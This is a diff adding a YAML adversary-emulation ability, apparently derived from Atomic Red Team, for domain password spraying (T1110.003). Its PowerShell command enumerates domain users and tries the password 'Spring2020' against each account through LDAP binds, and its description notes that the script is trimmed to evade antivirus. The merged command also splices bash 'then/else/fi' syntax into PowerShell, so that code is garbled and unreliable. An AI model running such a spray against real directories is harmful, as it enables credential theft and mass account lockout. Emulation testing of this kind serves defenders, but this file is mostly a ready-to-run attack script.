@@ -1,0 +1,73 @@
+- id: b15bc9a5-a4f3-4879-9304-ea0011ace63a
+  name: Password Spray Invoke-DomainPasswordSpray Light
+  description: "Perform a domain password spray using the same core method of the\
+    \ [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray)\
+    \ \nbut without all the extra code that makes the script get blocked by many AVs.\
+    \ \nThis atomic test will attempt a single password against all users in a password\
+    \ list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor\
+    \ with the automated prereq_command. The prereq_command will limit the user list\
+    \ to 200 users by default to help you avoid massive account lockout."
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else {exit
+          1}; then : ; else Write-Host -NoNewLine "Reading Users." # this code modifed
+          from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration;
+          $netOutput = net users /domain; $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]);
+          $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {; if($usercount
+          -ge $userLimit){break}; $line = $line.trim(); $line = $line -split ''\s\s+'';
+          foreach ($user in $line){; if($usercount -ge $userLimit){break}; Add-Content
+          $env:Temp\usersdpsLight.txt $user; $usercount = $usercount + 1; }; }; Write-Host
+          "Usernames saved to $env:Temp\usersdpsLight.txt"; fi; function Invoke-dpsLight
+          ($Password, $userlist) {; $users = Get-Content $userlist; $Domain = "LDAP://"
+          + ([ADSI]"").distinguishedName; foreach ($User in $users) {; $Domain_check
+          = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password);
+          if ($Domain_check.name -ne $null) {; Write-Host -ForegroundColor Green "Password
+          found for User:$User Password:$Password"; }; else { Write-Host ". " -NoNewline};
+          }; Write-Host -ForegroundColor green "Finished"; }; Invoke-dpsLight "Spring2020"
+          $env:Temp\usersdpsLight.txt'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1110.003
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      user_limit:
+        description: The max number of users to put in the list when running the prereq_command
+        type: integer
+        default: 200
+      password:
+        description: The password to try for each user in users.txt
+        type: string
+        default: Spring2020
+    dependencies:
+    - description: 'Username file must exist at $env:Temp\usersdpsLight.txt
+
+        '
+      prereq_command: 'if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else {exit
+        1}
+
+        '
+      get_prereq_command: "Write-Host -NoNewLine \"Reading Users.\" # this code modifed\
+        \ from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n\
+        $netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n\
+        $userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput)\
+        \ {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line\
+        \ = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount\
+        \ -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n\
+        \    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved\
+        \ to $env:Temp\\usersdpsLight.txt\"\n"
+    technique_created: '2020-02-11T18:39:25.122Z'
+    atomic_guid: b15bc9a5-a4f3-4879-9304-ea0011ace63a
+    import_timestamp: '2025-06-24T11:15:06.649961Z'
